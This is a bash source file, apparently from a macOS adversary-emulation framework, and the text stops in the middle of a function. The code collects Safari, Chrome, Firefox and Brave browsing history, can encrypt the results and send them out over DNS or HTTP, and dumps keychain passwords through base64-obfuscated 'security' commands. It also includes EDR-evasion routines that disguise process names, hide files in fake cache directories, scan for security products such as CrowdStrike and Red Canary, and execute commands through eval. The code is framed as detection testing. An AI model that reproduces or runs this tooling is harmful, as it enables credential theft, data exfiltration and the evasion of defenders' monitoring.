# - Tests EDR detection of here-string command execution
core_exec_cmd_herestring() {
    local cmd_string="$1"
    
    if [ -z "$cmd_string" ]; then
        core_debug_print "No command provided to core_exec_cmd_herestring"
        return 1
    fi
    
    core_debug_print "Executing command via here-string: $cmd_string"
    
    # Execute command using here-string (feeds command as stdin to shell)
    sh <<< "$cmd_string"
    
    return $?
}

# Purpose: Execute command using dynamic string construction (EDR evasion test)
# Inputs: Variable number of string fragments to concatenate into command
# Outputs: Command execution result
# - Tests EDR detection of dynamically constructed commands
core_exec_cmd_construct() {
    local fragments="$*"
    local constructed_cmd=""
    
    if [ -z "$fragments" ]; then
        core_debug_print "No command fragments provided to core_exec_cmd_construct"
        return 1
    fi
    
    # Concatenate all fragments into single command
    for fragment in $fragments; do
        constructed_cmd="${constructed_cmd}${fragment}"
    done
    
    core_debug_print "Dynamically constructed command: $constructed_cmd"
    
    # Execute the constructed command
    eval "$constructed_cmd"
    
    return $?
}

# Purpose: Execute keychain commands using base64 obfuscation (EDR evasion test)
# Inputs: $1 - operation type (dump|find|list)
# Outputs: Keychain command execution result  
# - Tests EDR detection of obfuscated keychain access
core_exec_keychain_obfuscated() {
    local operation="$1"
    local cmd=""
    
    case "$operation" in
        "dump")
            # Construct: security dump-keychain
            local a=$(echo "c2VjdXJpdHk=" | base64 -d)  # "security"
            local b=" "
            local c=$(echo "ZHVtcC1rZXljaGFpbg==" | base64 -d)  # "dump-keychain"
            cmd="$a$b$c"
            ;;
        "find")
            # Construct: security find-generic-password -g
            local a=$(echo "c2VjdXJpdHk=" | base64 -d)  # "security"
            local b=" "
            local c=$(echo "ZmluZC1nZW5lcmljLXBhc3N3b3Jk" | base64 -d)  # "find-generic-password"
            local d=" -g"
            cmd="$a$b$c$d"
            ;;
        "list")
            # Construct: security list-keychains
            local a=$(echo "c2VjdXJpdHk=" | base64 -d)  # "security"
            local b=" "
            local c=$(echo "bGlzdC1rZXljaGFpbnM=" | base64 -d)  # "list-keychains"
            cmd="$a$b$c"
            ;;
        *)
            core_debug_print "Unknown keychain operation: $operation"
            return 1
            ;;
    esac
    
    core_debug_print "Executing obfuscated keychain command: $cmd"
    eval "$cmd"
    
    return $?
}

# Main function 
core_main() {
    # Step 1: Parse command line arguments (no validation)
    core_parse_args "$@"
    
    # Step 2: Display help if requested (early exit)
    if [ "$SHOW_HELP" = true ]; then
        core_display_help
        return 0
    fi
    
    # Step 3: Validate parsed arguments
    core_validate_parsed_args || exit 1
    
    # Step 4: Generate encryption key if needed
    core_generate_encryption_key
    
    # Step 5: Validate required commands
    core_validate_command || exit 1
    
    # Step 6: Check if isolated execution is requested
    if [ "$ISOLATED" = "true" ]; then
        core_debug_print "Executing script in memory isolated mode"
        
        # Create isolated execution environment
        local buffer_name="main_$(date +%s)"
        if memory_create_buffer "$buffer_name"; then
            # Execute main logic in isolated process
            memory_spawn_isolated "$buffer_name" "$(declare -f core_execute_main_logic); core_execute_main_logic"
            sleep 1  # Allow execution time
            
            # Read results from isolated process
            local isolated_result=$(memory_read_buffer "${buffer_name}_proc")
            
            # Cleanup isolation
            memory_cleanup_buffer "$buffer_name"
            
            # Output results
            if [ -n "$isolated_result" ]; then
                printf "%s\n" "$isolated_result"
            fi
            
            core_debug_print "Isolated execution completed"
            return 0
        else
            core_handle_error "Failed to create isolated execution environment, falling back to normal execution"
            # Fall through to normal execution
        fi
    fi
    
    # Step 7: Normal execution (or fallback from failed isolation)
    core_execute_main_logic
}

# Purpose: Execute the main script logic (can be called normally or in isolation)
# Inputs: None (uses global variables)
# Outputs: Processed script results
# - Contains all the core execution logic
core_execute_main_logic() {
    local raw_output=""
    local processed_output=""
    
    # Process OPSEC checks from YAML configuration
    if [ "$CHECK_FDA" = "true" ]; then
        core_debug_print "Performing Full Disk Access check"
        if ! core_check_fda; then
            core_handle_error "Full Disk Access not granted - script cannot access required databases"
            exit 1
        fi
        core_debug_print "Full Disk Access check passed"
    fi
    
    if [ "$CHECK_PERMS" = "true" ]; then
        core_debug_print "Permission checks enabled - will be validated per function"
    fi
    
    if [ "$CHECK_DB_LOCK" = "true" ]; then
        core_debug_print "Database lock checks enabled - will be validated per function"
    fi
    
    # Initialize the log file if logging is enabled
    if [ "$LOG_ENABLED" = true ]; then
        # Initialize logging at start
        core_log_output "Starting ${NAME}" "started" true
    fi
    
    # Default data source identifier
    local data_source="generic"
    
    # Check if we should extract steganography data
    if [ "$STEG_EXTRACT" = true ]; then
        data_source="steg_extracted"
    else
        # Execute script-specific logic here
# Execute main logic
raw_output=""

# Set global function language for this procedure
FUNCTION_LANG="shell"

# Process input arguments
process_input_arguments

# Helper function to execute procedure functions
execute_function() {
    local func_name="$1"
    # Call the function directly - let the function handle its own permissions
    $func_name
}

# Execute functions for -s|--safari
if [ "$SAFARI" = true ]; then
    core_debug_print "Executing functions for -s|--safari"
    result=$(execute_function query_safari_history)
    raw_output="${raw_output}${result}"
fi

# Execute functions for -c|--chrome
if [ "$CHROME" = true ]; then
    core_debug_print "Executing functions for -c|--chrome"
    result=$(execute_function query_chrome_history)
    raw_output="${raw_output}${result}"
fi

# Execute functions for -f|--firefox
if [ "$FIREFOX" = true ]; then
    core_debug_print "Executing functions for -f|--firefox"
    result=$(execute_function query_firefox_history)
    raw_output="${raw_output}${result}"
fi

# Execute functions for -b|--brave
if [ "$BRAVE" = true ]; then
    core_debug_print "Executing functions for -b|--brave"
    result=$(execute_function query_brave_history)
    raw_output="${raw_output}${result}"
fi

# Execute functions for --search
if [ "$SEARCH" = true ]; then
    core_debug_print "Executing functions for --search"
fi

# Execute functions for --last
if [ "$LAST" = true ]; then
    core_debug_print "Executing functions for --last"
fi

# Execute functions for --starttime
if [ "$STARTTIME" = true ]; then
    core_debug_print "Executing functions for --starttime"
fi

# Execute functions for --endtime
if [ "$ENDTIME" = true ]; then
    core_debug_print "Executing functions for --endtime"
fi

# Set procedure name for processing
procedure="browser_history"
        # This section is intentionally left empty as it will be filled by
        # technique-specific implementations when sourcing this base script
        # If no raw_output is set by the script, exit gracefully
        if [ -z "$raw_output" ]; then
            return 0
        fi  
    fi
    # Process the output (format, encode, encrypt)
    processed_output=$(core_process_output "$raw_output" "$PROCEDURE_NAME")
    
    # Handle the final output (log, exfil, or display)
    core_transform_output "$processed_output"
}

# Purpose: Validate parsed arguments for correctness and security
# Inputs: None (uses global variables set by core_parse_args)
# Outputs: 0 if valid, 1 if invalid
# - Prints error messages for invalid arguments but continues execution
core_validate_parsed_args() {
    local validation_errors=""
    local has_valid_actions=false
    
    # Check if we have any valid actions to execute
    if [ "$LIST_FILES" = true ] || [ "$STEG_EXTRACT" = true ] || [ "$SHOW_HELP" = true ]; then
        has_valid_actions=true
    fi
    
    # Validate chunk size if provided
    if [ -n "$CHUNK_SIZE" ]; then
        if ! core_validate_input "$CHUNK_SIZE" "integer"; then
            validation_errors="${validation_errors}Invalid chunk size: $CHUNK_SIZE (must be positive integer)\n"
        fi
    fi
    
    # Validate format if provided
    if [ -n "$FORMAT" ]; then
        case "$FORMAT" in
            json|csv|raw) ;;
            *) 
                validation_errors="${validation_errors}Invalid format: $FORMAT (must be json, csv, or raw)\n"
                ;;
        esac
    fi
    
    # Validate encoding if provided
    if [ -n "$ENCODE" ] && [ "$ENCODE" != "none" ]; then
        case "$ENCODE" in
            base64|b64|hex|perl_b64|perl_utf8) ;;
            *)
                validation_errors="${validation_errors}Invalid encoding: $ENCODE (must be base64, hex, perl_b64, or perl_utf8)\n"
                ;;
        esac
    fi
    
    # Validate encryption if provided
    if [ -n "$ENCRYPT" ] && [ "$ENCRYPT" != "none" ]; then
        case "$ENCRYPT" in
            aes|gpg|xor) ;;
            *)
                validation_errors="${validation_errors}Invalid encryption: $ENCRYPT (must be aes, gpg, or xor)\n"
                ;;
        esac
    fi
    
    # Validate exfiltration settings
    if [ "$EXFIL" = true ]; then
        if [ -z "$EXFIL_METHOD" ]; then
            validation_errors="${validation_errors}Exfiltration enabled but no method specified\n"
        fi
        
        if [ -z "$EXFIL_URI" ]; then
            validation_errors="${validation_errors}Exfiltration enabled but no URI specified\n"
        else
            # Validate the URI based on method
            case "$EXFIL_METHOD" in
                dns)
                    if ! core_validate_input "$EXFIL_URI" "domain"; then
                        validation_errors="${validation_errors}Invalid domain format: $EXFIL_URI\n"
                    elif ! core_validate_domain "$EXFIL_URI"; then
                        validation_errors="${validation_errors}Domain does not resolve: $EXFIL_URI\n"
                    fi
                    ;;
                http|https)
                    if ! core_validate_input "$EXFIL_URI" "url"; then
                        validation_errors="${validation_errors}Invalid URL format: $EXFIL_URI\n"
                    else
                        # Extract and validate domain
                        local domain=$(core_extract_domain_from_url "$EXFIL_URI")
                        if ! core_validate_domain "$domain"; then
                            validation_errors="${validation_errors}Domain does not resolve: $domain (from URL: $EXFIL_URI)\n"
                        fi
                    fi
                    ;;
                *)
                    validation_errors="${validation_errors}Invalid exfiltration method: $EXFIL_METHOD\n"
                    ;;
            esac
        fi
    fi
    
    # Validate file paths if provided
    if [ -n "$STEG_EXTRACT_FILE" ]; then
        if ! core_validate_input "$STEG_EXTRACT_FILE" "file_path"; then
            validation_errors="${validation_errors}Invalid file path: $STEG_EXTRACT_FILE\n"
        fi
    fi
    
    if [ -n "$STEG_CARRIER_IMAGE" ]; then
        if ! core_validate_input "$STEG_CARRIER_IMAGE" "file_path"; then
            validation_errors="${validation_errors}Invalid carrier image path: $STEG_CARRIER_IMAGE\n"
        fi
    fi
    
    if [ -n "$STEG_OUTPUT_IMAGE" ]; then
        if ! core_validate_input "$STEG_OUTPUT_IMAGE" "file_path"; then
            validation_errors="${validation_errors}Invalid output image path: $STEG_OUTPUT_IMAGE\n"
        fi
    fi
    
    # Validate proxy URL if provided
    if [ -n "$PROXY_URL" ]; then
        if ! core_validate_input "$PROXY_URL" "url"; then
            validation_errors="${validation_errors}Invalid proxy URL: $PROXY_URL\n"
        fi
    fi
    
    # Report all validation errors at once
    if [ -n "$validation_errors" ]; then
        # If we have valid actions, continue; otherwise exit
        if [ "$has_valid_actions" = true ]; then
            # Format as single line warning since script continues
            local formatted_errors=$("$CMD_PRINTF"  "%b" "$validation_errors" | tr '\n' '; ' | sed 's/; $//')
            "$CMD_PRINTF"  "[WARNING] [%s] Argument validation issues found: %s\n" "$(core_get_timestamp)" "$formatted_errors" >&2
            return 0
        else
            core_handle_error "Argument validation errors found:"
            "$CMD_PRINTF"  "%b" "$validation_errors" >&2
            core_handle_error "No valid actions specified - exiting"
            return 1
        fi
    fi
    
    core_debug_print "All parsed arguments validated successfully"
    return 0
}

# Purpose: Generate encryption key if encryption is enabled
# Inputs: None (uses global ENCRYPT variable)
# Outputs: None
# - Sets global ENCRYPT_KEY variable
core_generate_encryption_key() {
    if [ "$ENCRYPT" != "none" ]; then
        ENCRYPT_KEY=$("$CMD_PRINTF" '%s' "$JOB_ID$(date +%s%N)$RANDOM" | $CMD_OPENSSL dgst -sha256 | cut -d ' ' -f 2)
        if [ "$DEBUG" = true ]; then
            $CMD_PRINTF "[DEBUG] [%s] Using encryption key: %s\n" "$(core_get_timestamp)" "$ENCRYPT_KEY" >&2
        fi
        core_debug_print "Encryption key generated for method: $ENCRYPT"
    fi
}

# Generate job ID now that core functions are defined

# Input processing and type conversion
process_input_arguments() {
    # Process and validate input arguments based on their types
    
    # Process --search argument
    if [ -n "${INPUT_SEARCH}" ]; then
        # Process string input
        SEARCH_ARG="${INPUT_SEARCH}"
    fi
    
    # Process --last argument
    if [ -n "${INPUT_LAST}" ]; then
        # Validate integer input
        if ! echo "${INPUT_LAST}" | grep -qE '^[0-9]+$'; then
            echo "Error: --last requires a valid integer, got: ${INPUT_LAST}" >&2
            exit 1
        fi
        LAST_ARG="${INPUT_LAST}"
    fi
    
    # Process --starttime argument
    if [ -n "${INPUT_STARTTIME}" ]; then
        # Process string input
        STARTTIME_ARG="${INPUT_STARTTIME}"
    fi
    
    # Process --endtime argument
    if [ -n "${INPUT_ENDTIME}" ]; then
        # Process string input
        ENDTIME_ARG="${INPUT_ENDTIME}"
    fi
}


# Function: query_safari_history
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

query_safari_history() {
    # Build search clause locally like the working script
    local search_clause=""
    if [ -n "$INPUT_SEARCH" ]; then
        local input_search_escaped="${INPUT_SEARCH//\'/\'\'}"
        search_clause="AND (hi.url LIKE '%${input_search_escaped}%' OR hi.domain_expansion LIKE '%${input_search_escaped}%' OR hv.title LIKE '%${input_search_escaped}%')"
    fi

    # Use the exact pattern from the working script
    local query="${SAFARI_HDB_QUERY//\$INPUT_LAST/$INPUT_LAST}"
    local query_final="${query//\$INPUT_SEARCH/$search_clause}"

    local result=$(query_browser_db "$DB_HISTORY_SAFARI" "$query_final")
    core_debug_print "Query result length: ${#result} characters"
    printf "%s\n" "$result"
    return 0
}


# Function: query_chrome_history
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

query_chrome_history() {
    local search_clause=""
    if [ -n "$INPUT_SEARCH" ]; then
        local input_search_escaped="${INPUT_SEARCH//\'/\'\'}"
        search_clause="AND (url LIKE '%${input_search_escaped}%' OR title LIKE '%${input_search_escaped}%')"
    fi

    local query="${CHROME_HDB_QUERY//\$INPUT_LAST/$INPUT_LAST}"
    local query_final="${query//\$INPUT_SEARCH/$search_clause}"
    
    core_debug_print "Executing Chrome history query"
    
    local result=$(query_browser_db "$DB_HISTORY_CHROME" "$query_final")
    printf "%s\n" "$result"
    return 0
}


# Function: query_firefox_history
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

query_firefox_history() {
    local firefox_db=$(resolve_firefox_db)

    local search_clause=""
    if [ -n "$INPUT_SEARCH" ]; then
        local input_search_escaped="${INPUT_SEARCH//\'/\'\'}"
        search_clause="AND (url LIKE '%${input_search_escaped}%' OR title LIKE '%${input_search_escaped}%')"
    fi

    local query="${FIREFOX_HDB_QUERY//\$INPUT_LAST/$INPUT_LAST}"
    local query_final="${query//\$INPUT_SEARCH/$search_clause}"
    
    core_debug_print "Executing Firefox history query"
    
    local result=$(query_browser_db "$firefox_db" "$query_final")
    printf "%s\n" "$result"
    return 0
}


# Function: query_brave_history
# Type: main
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

query_brave_history() {
    local search_clause=""
    if [ -n "$INPUT_SEARCH" ]; then
        local input_search_escaped="${INPUT_SEARCH//\'/\'\'}"
        search_clause="AND (url LIKE '%${input_search_escaped}%' OR title LIKE '%${input_search_escaped}%')"
    fi

    # Use the exact pattern from the working script
    local query="${BRAVE_HDB_QUERY//\$INPUT_LAST/$INPUT_LAST}"
    local query_final="${query//\$INPUT_SEARCH/$search_clause}"
    
    core_debug_print "Executing Brave history query"
    
    local result=$(query_browser_db "$DB_HISTORY_BRAVE" "$query_final")
    printf "%s\n" "$result"
    return 0
}


# Function: resolve_firefox_db
# Type: helper
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

resolve_firefox_db() {
    ls "$HOME/Library/Application Support/Firefox/Profiles/"*.default-release/places.sqlite 2>/dev/null | head -n 1
    return $?
}


# Function: query_browser_db
# Type: helper
# Languages: shell
FUNCTION_LANG="shell"
# Sudo privileges: Not required

query_browser_db() {
    local db="$1"
    local query="$2"
    local db_name=$(basename "$db")
    
    core_debug_print "=== Database Query Debug ==="
    core_debug_print "Database: '$db'"
    core_debug_print "Command: '$CMD_QUERY_BROWSER_DB'"
    core_debug_print "Full command: $CMD_QUERY_BROWSER_DB '$db' '$query'"
    core_debug_print "Executing query..."
    
    # Execute query and capture both stdout and stderr
    local result
    local error_output
    error_output=$($CMD_QUERY_BROWSER_DB "$db" "$query" 2>&1)
    local exit_code=$?
    
    if [ $exit_code -ne 0 ]; then
        # Check if it's a database lock error
        if echo "$error_output" | grep -q "database is locked"; then
            core_handle_error "Database '$db_name' is locked - close the browser first or wait for it to finish"
        elif echo "$error_output" | grep -q "no such file"; then
            core_handle_error "Database file not found: '$db'"
        elif echo "$error_output" | grep -q "permission denied"; then
            core_handle_error "Permission denied accessing database: '$db_name'"
        else
            core_handle_error "Database query failed for '$db_name': $error_output"
        fi
        return $exit_code
    fi
    
    # Output the result if successful
    echo "$error_output"
    return 0
}



JOB_ID=$(core_generate_job_id)

# =============================================================================
# MEMORY ISOLATION SYSTEM - Pure Memory Buffer Communication
# =============================================================================

# Purpose: Create memory buffer using named pipes (FIFOs) - pure memory isolation
# Inputs: $1 = buffer name (unique identifier)
# Outputs: 0 if success, 1 if error
# - Creates memory-only communication channel using named pipes
memory_create_buffer() {
    local buffer_name="${1:-main}"
    local pipe_dir="/tmp/mem_${JOB_ID}"
    local pipe_path="${pipe_dir}/${buffer_name}.pipe"
    
    if [ -z "$buffer_name" ]; then
        core_handle_error "Buffer name required for memory isolation"
        return 1
    fi
    
    # Create pipe directory if needed
    if [ ! -d "$pipe_dir" ]; then
        mkdir -p "$pipe_dir" || {
            core_handle_error "Failed to create pipe directory"
            return 1
        }
    fi
    
    # Create named pipe (FIFO) for memory communication
    if mkfifo "$pipe_path" 2>/dev/null; then
        core_debug_print "Created memory buffer: $buffer_name (pipe: $pipe_path)"
        return 0
    else
        core_handle_error "Failed to create memory buffer: $buffer_name"
        return 1
    fi
}

# Purpose: Write data to memory buffer using named pipe
# Inputs: $1 = buffer name, $2 = data to write
# Outputs: 0 if success, 1 if error
# - Pure memory write via named pipe
memory_write_buffer() {
    local buffer_name="$1"
    local data="$2"
    local pipe_dir="/tmp/mem_${JOB_ID}"
    local pipe_path="${pipe_dir}/${buffer_name}.pipe"
    
    if [ -z "$buffer_name" ] || [ -z "$data" ]; then
        core_handle_error "Buffer name and data required for memory write"
        return 1
    fi
    
    # Check if pipe exists
    if [ ! -p "$pipe_path" ]; then
        core_handle_error "Memory buffer does not exist: $buffer_name"
        return 1
    fi
    
    # Write to named pipe using shell redirection
    printf "%s\n" "$data" > "$pipe_path" &
    
    if [ $? -eq 0 ]; then
        core_debug_print "Wrote to memory buffer: $buffer_name"
        return 0
    else
        core_handle_error "Failed to write to memory buffer: $buffer_name"
        return 1
    fi
}

# Purpose: Read data from memory buffer using named pipe
# Inputs: $1 = buffer name
# Outputs: Buffer contents to stdout
# - Memory-only read via named pipe
memory_read_buffer() {
    local buffer_name="$1"
    local pipe_dir="/tmp/mem_${JOB_ID}"
    local pipe_path="${pipe_dir}/${buffer_name}.pipe"
    
    if [ -z "$buffer_name" ]; then
        core_handle_error "Buffer name required for memory read"
        return 1
    fi
    
    # Check if pipe exists
    if [ ! -p "$pipe_path" ]; then
        core_debug_print "Memory buffer does not exist: $buffer_name"
        return 1
    fi
    
    # Read ALL lines from the named pipe with timeout
    local all_data=""
    local line=""
    local line_count=0
    
    # Use cat with timeout to read all available data
    if command -v timeout >/dev/null 2>&1; then
        all_data=$(timeout 2 cat "$pipe_path" 2>/dev/null)
    else
        # Fallback: read line by line with timeout
        while read -t 1 -r line < "$pipe_path" 2>/dev/null; do
            if [ $line_count -eq 0 ]; then
                all_data="$line"
            else
                all_data="${all_data}\n${line}"
            fi
            line_count=$((line_count + 1))
        done
    fi
    
    if [ -n "$all_data" ]; then
        printf "%s" "$all_data"
        return 0
    else
        core_debug_print "No data available in buffer: $buffer_name"
        return 1
    fi
}

# Purpose: Spawn isolated process using memory buffer communication
# Inputs: $1 = buffer name, $2 = command to execute
# Outputs: 0 if success, 1 if error
# - Creates isolated process with named pipe communication
memory_spawn_isolated() {
    local buffer_name="$1"
    local command="$2"
    local pipe_dir="/tmp/mem_${JOB_ID}"
    local pipe_path="${pipe_dir}/${buffer_name}_proc.pipe"
    
    if [ -z "$buffer_name" ] || [ -z "$command" ]; then
        core_handle_error "Buffer name and command required for isolated spawn"
        return 1
    fi
    
    # Create isolated pipe for process communication
    if memory_create_buffer "${buffer_name}_proc"; then
        # Execute command in background with output to memory buffer
        (
            eval "$command" 2>&1 > "${pipe_path}" &
        ) &
        
        local proc_pid=$!
        echo "$proc_pid" > "${pipe_path}.pid"
        
        core_debug_print "Spawned isolated process: $buffer_name (PID: $proc_pid)"
        return 0
    else
        core_handle_error "Failed to spawn isolated process: $buffer_name"
        return 1
    fi
}

# Purpose: Check if memory buffer exists and is active
# Inputs: $1 = buffer name
# Outputs: 0 if active, 1 if not active
memory_check_buffer() {
    local buffer_name="$1"
    local pipe_dir="/tmp/mem_${JOB_ID}"
    local pipe_path="${pipe_dir}/${buffer_name}.pipe"
    
    if [ -z "$buffer_name" ]; then
        return 1
    fi
    
    # Check if named pipe exists and is accessible
    [ -p "$pipe_path" ] && [ -r "$pipe_path" ]
    return $?
}

# Purpose: Clean up memory buffer (remove pipe and kill processes)
# Inputs: $1 = buffer name
# Outputs: 0 if success, 1 if error
memory_cleanup_buffer() {
    local buffer_name="$1"
    local pipe_dir="/tmp/mem_${JOB_ID}"
    local pipe_path="${pipe_dir}/${buffer_name}.pipe"
    local pid_file="${pipe_path}.pid"
    
    if [ -z "$buffer_name" ]; then
        core_handle_error "Buffer name required for cleanup"
        return 1
    fi
    
    # Kill associated processes
    if [ -f "$pid_file" ]; then
        local pid=$(cat "$pid_file" 2>/dev/null)
        if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
            kill "$pid" 2>/dev/null
            core_debug_print "Terminated process: $pid"
        fi
        rm -f "$pid_file"
    fi
    
    # Remove named pipe
    if [ -p "$pipe_path" ]; then
        rm -f "$pipe_path"
        core_debug_print "Removed memory buffer: $pipe_path"
    fi
    
    # Also clean up process pipe
    local proc_pipe="${pipe_dir}/${buffer_name}_proc.pipe"
    local proc_pid_file="${proc_pipe}.pid"
    
    if [ -f "$proc_pid_file" ]; then
        local proc_pid=$(cat "$proc_pid_file" 2>/dev/null)
        if [ -n "$proc_pid" ] && kill -0 "$proc_pid" 2>/dev/null; then
            kill "$proc_pid" 2>/dev/null
        fi
        rm -f "$proc_pid_file"
    fi
    
    if [ -p "$proc_pipe" ]; then
        rm -f "$proc_pipe"
    fi
    
    core_debug_print "Cleaned up memory buffer: $buffer_name"
    return 0
}

# Purpose: Clean up all memory buffers for current job
# Inputs: None
# Outputs: None
# - Emergency cleanup function
memory_cleanup_all() {
    local pipe_dir="/tmp/mem_${JOB_ID}"
    
    if [ -d "$pipe_dir" ]; then
        # Kill all processes
        for pid_file in "$pipe_dir"/*.pid; do
            if [ -f "$pid_file" ]; then
                local pid=$(cat "$pid_file" 2>/dev/null)
                if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
                    kill "$pid" 2>/dev/null
                    core_debug_print "Terminated process: $pid"
                fi
            fi
        done
        
        # Remove entire pipe directory
        rm -rf "$pipe_dir"
        core_debug_print "All memory buffers cleaned up for job: $JOB_ID"
    fi
}

# =============================================================================

# Purpose: Get log filename dynamically based on PROCEDURE_NAME
# Inputs: None
# Outputs: Log filename string
# - Sets LOG_FILE_NAME and SYSLOG_TAG globals if not already set
core_get_log_filename() {
    if [ -z "$LOG_FILE_NAME" ]; then
        if [ -n "$PROCEDURE_NAME" ]; then
            LOG_FILE_NAME="${TTP_ID}_${PROCEDURE_NAME}.log"
            SYSLOG_TAG="${TTP_ID}_${PROCEDURE_NAME}"
        else
            LOG_FILE_NAME="${TTP_ID}.log"
            SYSLOG_TAG="${TTP_ID}"
        fi
    fi
    echo "$LOG_FILE_NAME"
}

# =============================================================================
# MEMORY ISOLATION SYSTEM - STEALTH MODE (EDR Evasion)
# =============================================================================

# Purpose: Create memory buffer using native methods to avoid EDR detection
# Inputs: $1 = buffer name, $2 = stealth mode (true/false)
# Outputs: 0 if success, 1 if error
# - Minimizes process creation and suspicious patterns
memory_create_buffer_stealth() {
    local buffer_name="${1:-main}"
    local stealth_mode="${2:-false}"
    local socket_dir="/tmp/.${USER}_cache"  # Mimics system cache directory
    local socket_path="${socket_dir}/.${buffer_name}"  # Hidden file
    
    if [ -z "$buffer_name" ]; then
        core_handle_error "Buffer name required for memory isolation"
        return 1
    fi
    
    # Create innocuous-looking cache directory
    if [ ! -d "$socket_dir" ]; then
        mkdir -p "$socket_dir" || {
            core_handle_error "Failed to create cache directory"
            return 1
        }
        
        # Set normal cache directory permissions
        chmod 755 "$socket_dir"
    fi
    
    if [ "$stealth_mode" = "true" ]; then
        # Method 1: Use native bash co-processes (no external commands)
        core_debug_print "Using native bash co-process for stealth"
        
        # Create named pipe using mkfifo (more common than nc)
        if mkfifo "$socket_path" 2>/dev/null; then
            # Make it look like a cache file
            touch "${socket_path}.cache" 2>/dev/null
            core_debug_print "Created stealth memory buffer: $buffer_name (fifo: $socket_path)"
            return 0
        else
            core_handle_error "Failed to create stealth memory buffer: $buffer_name"
            return 1
        fi
    else
        # Original method with netcat (less stealthy)
        memory_create_buffer "$buffer_name"
        return $?
    fi
}

# Purpose: Memory communication using file descriptors (no processes)
# Inputs: $1 = buffer name, $2 = data, $3 = stealth mode
# Outputs: 0 if success, 1 if error
# - Uses pure shell file descriptors to avoid process creation
memory_write_buffer_stealth() {
    local buffer_name="$1"
    local data="$2"
    local stealth_mode="${3:-false}"
    local socket_dir="/tmp/.${USER}_cache"
    local socket_path="${socket_dir}/.${buffer_name}"
    
    if [ -z "$buffer_name" ] || [ -z "$data" ]; then
        core_handle_error "Buffer name and data required for memory write"
        return 1
    fi
    
    if [ "$stealth_mode" = "true" ]; then
        # Use shell file descriptors directly (no external processes)
        if [ -p "$socket_path" ]; then
            # Write using shell redirection (no echo process)
            printf "%s\n" "$data" > "$socket_path" &
            local write_pid=$!
            
            # Store minimal metadata in hidden file
            printf "%d\n" "$write_pid" > "${socket_path}.pid" 2>/dev/null
            
            core_debug_print "Wrote to stealth memory buffer: $buffer_name"
            return 0
        else
            core_handle_error "Stealth memory buffer does not exist: $buffer_name"
            return 1
        fi
    else
        # Original method
        memory_write_buffer "$buffer_name" "$data"
        return $?
    fi
}

# Purpose: Read from memory buffer using shell built-ins only
# Inputs: $1 = buffer name, $2 = stealth mode
# Outputs: Buffer contents to stdout
# - Uses shell read built-in to avoid process creation
memory_read_buffer_stealth() {
    local buffer_name="$1"
    local stealth_mode="${2:-false}"
    local socket_dir="/tmp/.${USER}_cache"
    local socket_path="${socket_dir}/.${buffer_name}"
    
    if [ -z "$buffer_name" ]; then
        core_handle_error "Buffer name required for memory read"
        return 1
    fi
    
    if [ "$stealth_mode" = "true" ]; then
        # Use shell built-in read (no cat process)
        if [ -p "$socket_path" ]; then
            # Open file descriptor for reading
            exec 3< "$socket_path"
            
            # Read using shell built-in with timeout
            if read -t 1 -r line <&3 2>/dev/null; then
                printf "%s\n" "$line"
                exec 3<&-  # Close file descriptor
                return 0
            else
                exec 3<&-  # Close file descriptor
                core_debug_print "No data available in stealth buffer: $buffer_name"
                return 1
            fi
        else
            core_debug_print "Stealth memory buffer does not exist: $buffer_name"
            return 1
        fi
    else
        # Original method
        memory_read_buffer "$buffer_name"
        return $?
    fi
}

# Purpose: Clean up stealth memory buffers (minimal footprint)
# Inputs: $1 = buffer name, $2 = stealth mode
# Outputs: 0 if success, 1 if error
memory_cleanup_buffer_stealth() {
    local buffer_name="$1"
    local stealth_mode="${2:-false}"
    local socket_dir="/tmp/.${USER}_cache"
    local socket_path="${socket_dir}/.${buffer_name}"
    
    if [ -z "$buffer_name" ]; then
        core_handle_error "Buffer name required for cleanup"
        return 1
    fi
    
    if [ "$stealth_mode" = "true" ]; then
        # Minimal cleanup - just remove files
        if [ -e "$socket_path" ]; then
            rm -f "$socket_path" 2>/dev/null
        fi
        
        # Remove metadata files
        rm -f "${socket_path}.cache" 2>/dev/null
        rm -f "${socket_path}.pid" 2>/dev/null
        
        # Remove cache directory if empty (looks natural)
        rmdir "$socket_dir" 2>/dev/null || true
        
        core_debug_print "Cleaned up stealth memory buffer: $buffer_name"
        return 0
    else
        # Original method
        memory_cleanup_buffer "$buffer_name"
        return $?
    fi
}

# Purpose: Execute command in memory-isolated environment with minimal telemetry
# Inputs: $1 = command, $2 = stealth mode
# Outputs: Command output via memory buffer
# - Reduces process tree visibility
memory_exec_stealth() {
    local command="$1"
    local stealth_mode="${2:-true}"
    local buffer_name="exec_$(date +%s)"
    
    if [ -z "$command" ]; then
        core_handle_error "Command required for stealth execution"
        return 1
    fi
    
    # Create stealth buffer
    if memory_create_buffer_stealth "$buffer_name" "$stealth_mode"; then
        # Execute command with output redirect (background process)
        (
            # Change process name to look innocent
            exec -a "cache_worker" sh -c "
                $command 2>&1 | while IFS= read -r line; do
                    printf '%s\n' \"\$line\" > /tmp/.${USER}_cache/.\${buffer_name}
                done
            " &
        )
        
        # Brief delay then read results
        sleep 0.2
        memory_read_buffer_stealth "$buffer_name" "$stealth_mode"
        
        # Cleanup
        memory_cleanup_buffer_stealth "$buffer_name" "$stealth_mode"
        
        return 0
    else
        core_handle_error "Failed to create stealth execution environment"
        return 1
    fi
}

# Purpose: Check current EDR detection risk level
# Inputs: None
# Outputs: Risk assessment string
# - Analyzes current system for EDR presence
memory_assess_edr_risk() {
    local risk_level="LOW"
    local risk_factors=""
    
    # Check for common EDR processes
    if ps aux | grep -iE "(carbonblack|crowdstrike|cylance|sophos|defender|sentinel)" | grep -v grep >/dev/null 2>&1; then
        risk_level="HIGH"
        risk_factors="${risk_factors}EDR_PROCESS "
    fi
    
    # Check for monitoring tools
    if ps aux | grep -iE "(osquery|sysdig|falco)" | grep -v grep >/dev/null 2>&1; then
        risk_level="MEDIUM"
        risk_factors="${risk_factors}MONITORING_TOOLS "
    fi
    
    # Check for Red Canary specific indicators
    if ps aux | grep -iE "red.canary" | grep -v grep >/dev/null 2>&1; then
        risk_level="HIGH"
        risk_factors="${risk_factors}RED_CANARY "
    fi
    
    # Check for unusual process monitoring
    if pgrep -f "process.*monitor" >/dev/null 2>&1; then
